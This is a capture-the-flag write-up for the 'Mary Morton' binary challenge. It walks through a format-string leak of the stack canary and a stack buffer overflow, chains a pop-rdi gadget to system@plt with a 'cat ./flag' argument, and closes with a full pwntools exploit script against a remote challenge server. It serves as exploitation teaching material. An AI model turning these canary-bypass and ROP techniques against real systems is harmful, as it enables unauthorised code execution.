# Mary Morton

So after we download and extract the file, we have a binary. Let's take a look at the binary:
```
$    file mary_morton
mary_morton: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b7971b84c2309bdb896e6e39073303fc13668a38, stripped
$    pwn checksec mary_morton
[*] '/Hackery/asis/mary/mary_morton'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

So we see that it is a 64 bit Elf, with a stack canary and non executable stack. Let's see what happens when we runt he binary:

```
$    ./mary_morton
Welcome to the battle !
[Great Fairy] level pwned
Select your weapon
1. Stack Bufferoverflow Bug
2. Format String Bug
3. Exit the battle
2
%x.%x.%x.%x.%x
c743ca40.7f.14b4a890.0.0
1. Stack Bufferoverflow Bug
2. Format String Bug
3. Exit the battle
Alarm clock
```

So we see we are given a prompt for a Buffer Overflow, format string, or just to exit the battle. We confirmed that the format string bug indeed works with the `%x` flags. We can also that there is an alarm feature which will kill the program after a set amount of time. We can run it in gdb, that way when the Alarm Clock triggers it won't kill the program.

```
gdb-peda$ r
Starting program: /Hackery/asis/mary/mary_morton
Welcome to the battle !
[Great Fairy] level pwned
Select your weapon
1. Stack Bufferoverflow Bug
2. Format String Bug
3. Exit the battle
1
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
-> 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
��ں%�$P
@
*** stack smashing detected ***: /Hackery/asis/mary/mary_morton terminated

Program received signal SIGABRT, Aborted.
```

So we also verified that the buffer overflow bug is legit. Let's take a look at the source code in IDA, starting with the main function:

```
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int menu_choice; // [sp+24h] [bp-Ch]@2
  __int64 v4; // [sp+28h] [bp-8h]@1

  v4 = *MK_FP(__FS__, 40LL);
  alarm_func();
  puts("Welcome to the battle ! ");
  puts("[Great Fairy] level pwned ");
  puts("Select your weapon ");
  while ( 1 )
  {
    while ( 1 )
    {
      print_menu();
      __isoc99_scanf("%d", &menu_choice);
      if ( menu_choice != 2 )
        break;
      format_string_vuln();
    }
    if ( menu_choice == 3 )
    {
      puts("Bye ");
      exit(0);
    }
    if ( menu_choice == 1 )
      buffer_overflow_vuln();
    else
      puts("Wrong!");
  }
}
```

So we can see here the main function prints out the starting prompt, then enters into a loop where it will print out the menu options, then scan in input. Based upon the input, it will either trigger the `format_string_vuln` function, `buffer_overflow_vuln`function, or just exit the program. Let's take a look at the `format_string_vuln` function.

```
__int64 format_string_vuln()
{
  char input; // [sp+0h] [bp-90h]@1
  __int64 stack_canary; // [sp+88h] [bp-8h]@1

  stack_canary = *MK_FP(__FS__, 40LL);
  memset(&input, 0, 0x80uLL);
  read(0, &input, 0x7FuLL);
  printf(&input, &input);
  return *MK_FP(__FS__, 40LL) ^ stack_canary;
}
```

So we can see here, it pretty much does what we expected. Scans in input, then prints it unformatted using printf to have a format string vulnerability. Let's take a look at the `buffer_overflow_vuln()`

```
__int64 buffer_overflow_vuln()
{
  char buf; // [sp+0h] [bp-90h]@1
  __int64 stack_canary; // [sp+88h] [bp-8h]@1

  stack_canary = *MK_FP(__FS__, 40LL);
  memset(&buf, 0, 0x80uLL);
  read(0, &buf, 0x100uLL);
  printf("-> %s\n", &buf);
  return *MK_FP(__FS__, 40LL) ^ stack_canary;
}
```

Looking at this, we can see that it reads in 0x100 (256) bytes of data into the buffer with only 136 bytes of space (0x90 - 0x08 = 136). So this is a buffer overflow bug. So we should be able to use the buffer overflow vulnerability to hack the program. However our first hurdle will be to defeat the stack canary.

In order to reach the return address to gain code flow execution, we will have to write over the stack canary. Before we do that, we will need to leak the stack canary, so we can write over the stack canary with itself. That way when the stack canary is checked, everything will check out. We should be able to accomplish this using the format string exploit to leak an address. We can find the offset using gdb.

First set a breakpoint for the stack canary check in the `format_string_vuln` function, then run that function, then leak a bunch of 8 byte hex strings:
```
gdb-peda$ b *0x40094a
Breakpoint 1 at 0x40094a
gdb-peda$ r
Starting program: /Hackery/asis/mary/mary_morton
Welcome to the battle !
[Great Fairy] level pwned
Select your weapon
1. Stack Bufferoverflow Bug
2. Format String Bug
3. Exit the battle
2
%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.
7fffffffdea0.7f.7ffff7b08890.0.0.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c252e786c6c25.0.b7241689fbb16c00.7fffffffdf70.4008b8.
```

So a stack canary for 64 bit systems is an 8 byte hex string that ends in a null byte. Looking through the output, we can see such a hex string at offset 23 with `b7241689fbb16c00`. We can confirm that this is the stack canary once we reach the breakpoint by examining the value of `rbp-0x8`, since from the source code we can see  that is where the canary is:

```
Breakpoint 1, 0x000000000040094a in ?? ()
gdb-peda$ lx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.
Undefined command: "lx".  Try "help".
gdb-peda$ x/x $rbp-0x8
0x7fffffffdf28:    0x00
gdb-peda$ x/g $rbp-0x8
0x7fffffffdf28:    0xb7241689fbb16c00
gdb-peda$ i f
Stack level 0, frame at 0x7fffffffdf40:
 rip = 0x40094a; saved rip = 0x4008b8
 called by frame at 0x7fffffffdf80
 Arglist at 0x7fffffffde98, args:
 Locals at 0x7fffffffde98, Previous frame's sp is 0x7fffffffdf40
 Saved registers:
  rbp at 0x7fffffffdf30, rip at 0x7fffffffdf38

```

So we can see that it is indeed the stack canary, which is at offset 23. We can also see that the offset between the stack canary and the rip register is 16, so after the canary we will need to have an 8 byte offset before we hit the return address.

The next thing we will need to deal with is the Non-Executable stack. Since it is Non-Executable, we can't simply push shellcode onto the stack and execute it, so we will need to use ROP in order to execute code. Looking at the imports in ida, we can see that system is in there. So we should be able to call system using it's `plt` address. First we need to find it, which can be accomplished by using objdump:

```
objdump -D mary_morton | grep system
00000000004006a0 <system@plt>:
  4008e3:    e8 b8 fd ff ff           callq  4006a0 <system@plt>
```

So the address of system is `0x4006a0`. The next thing that we will need is a ROP gadget which will pop an argument into a register for system, then return to call it. We can accomplish this by using ROPgadget:

```
$    ROPgadget --binary mary_morton | less
```

Looking through the list of ROPgadgets, we can see one that will accomplish the job:

```
0x0000000000400ab3 : pop rdi ; ret
```

So we have a ROPgadget, and the address of system which we can call. The only thing left to get is the argument for the `system` function. Originally when I was trying to solve it, I tried to get a pointer to `"/bin/sh"` and use that as an argument, until I found a much easier way using gdb:

First set a breakpoint for anywhere in the program, then encounter it

```
gdb-peda$ b *0x400826
Breakpoint 1 at 0x400826
gdb-peda$ r
Starting program: /Hackery/asis/mary/mary_morton
```

then once you reach the breakpoint:

```
gdb-peda$ find cat
Searching for 'cat' in: None ranges
Found 84 results, display max 84 items:
mary_morton : 0x400b30 ("cat ./flag")
mary_morton : 0x600b30 ("cat ./flag")
       libc : 0x7ffff7a21115 --> 0x6b68635f746163 ('cat_chk')
       libc : 0x7ffff7a21132 --> 0x73746567746163 ('catgets')
       libc : 0x7ffff7a21f95 --> 0x705f6465746163 ('cated_p')
       libc : 0x7ffff7a22107 --> 0x6b68635f746163 ('cat_chk')
       libc : 0x7ffff7a22563 --> 0x7272647800746163 ('cat')
       libc : 0x7ffff7a228cb --> 0x705f5f0065746163 ('cate')
       libc : 0x7ffff7a2293d --> 0x676f6c61746163 ('catalog')
       libc : 0x7ffff7a22aa9 --> 0x6b68635f746163 ('cat_chk')
       libc : 0x7ffff7a22b38 --> 0x6d00343665746163 ('cate64')
       libc : 0x7ffff7a22b78 ("catclose")
       libc : 0x7ffff7a22dc9 --> 0x4f495f0065746163 ('cate')
       libc : 0x7ffff7a231f2 --> 0x73626f5f00746163 ('cat')
       libc : 0x7ffff7a23247 --> 0x7465670065746163 ('cate')
       libc : 0x7ffff7a23687 --> 0x67006e6f69746163 ('cation')
       libc : 0x7ffff7a2396c --> 0x6b68635f746163 ('cat_chk')
       libc : 0x7ffff7a23faa ("cat_cntr")
       libc : 0x7ffff7a24292 ("cate_rtsig")
       libc : 0x7ffff7a2445b --> 0x746e6c6300746163 ('cat')
       libc : 0x7ffff7a24615 ("cation_short_name")
       libc : 0x7ffff7a247c9 --> 0x5f00343665746163 ('cate64')
       libc : 0x7ffff7a24959 --> 0x6365786500746163 ('cat')
       libc : 0x7ffff7a24e87 --> 0x6e65706f746163 ('catopen')
--More--(25/85)q
gdb-peda$ x/s 0x400b30
0x400b30:    "cat ./flag"
```

We can see here that the binary has the string `"cat ./flag"` hardcoded at `0x400b30`. We should be able to use that as the argument for system. With all of those things, we can write the python exploit:

```
#First import pwntools
from pwn import *

#Establish the remote connection
target = remote('146.185.132.36', 19153)

#Establish the address for the ROP chain
gadget0 = 0x400ab3
cat_adr = 0x400b30
sys_adr = 0x4006a0

#Recieve and print out the opening text
print target.recvuntil("Exit the battle")

#Execute the format string exploit to leak the stack canary
target.sendline("2")
target.sendline("%23$llx")
target.recvline()
canary = target.recvline()
canary = int(canary, 16)
print "canary: " + hex(canary)
print target.recvuntil("Exit the battle")

#Put the Rop chain together, and send it to the server to exploit it
target.sendline("1")
payload = "0"*136 + p64(canary) + "1"*8 + p64(gadget0) + p64(cat_adr) + p64(sys_adr)
target.sendline(payload)

#Drop to an interactive shell
target.interactive()
```

Let's run the exploit:

```
$    python exploit.py
[+] Opening connection to 146.185.132.36 on port 19153: Done
Welcome to the battle !
[Great Fairy] level pwned
Select your weapon
1. Stack Bufferoverflow Bug
2. Format String Bug
3. Exit the battle
canary: 0x7e351a5ff4b1ec00
1. Stack Bufferoverflow Bug
2. Format String Bug
3. Exit the battle
[*] Switching to interactive mode
 
-> 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
ASIS{An_impROv3d_v3r_0f_f41rY_iN_fairy_lAnds!}
[*] Got EOF while reading in interactive
```

Just like that, we captured the flag!
